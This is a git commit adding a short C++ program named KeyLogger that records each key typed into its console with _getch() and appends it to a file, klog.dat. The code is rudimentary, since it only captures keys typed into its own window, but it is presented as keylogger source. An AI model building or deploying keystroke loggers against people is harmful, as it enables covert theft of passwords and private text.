cb7f022233bd9e6c54b2f5c4e6c21a39a575affd
AnonHexoDev <61375258+AnonHexo@users.noreply.github.com>
2021-02-07 15:31:31 +0100

    📤 Uploaded KeyLogger project

---
+++ KeyLogger/KeyLogger.cpp
@@ -0,0 +1,16 @@
+#include <iostream> // used for basic functions
+#include <conio.h> // used for _getch() function (get pressed keys)
+#include <fstream> // used to work with files
+
+using namespace std;
+
+int i;
+char key;
+
+int main() {
+	while (true) {
+		key = _getch(); // set char "key" to the current pressed key
+		ofstream file("C:klog.dat", std::ios_base::app /* << append instead of overwriting*/);
+		file << key; // append key to the file
+	}
+}
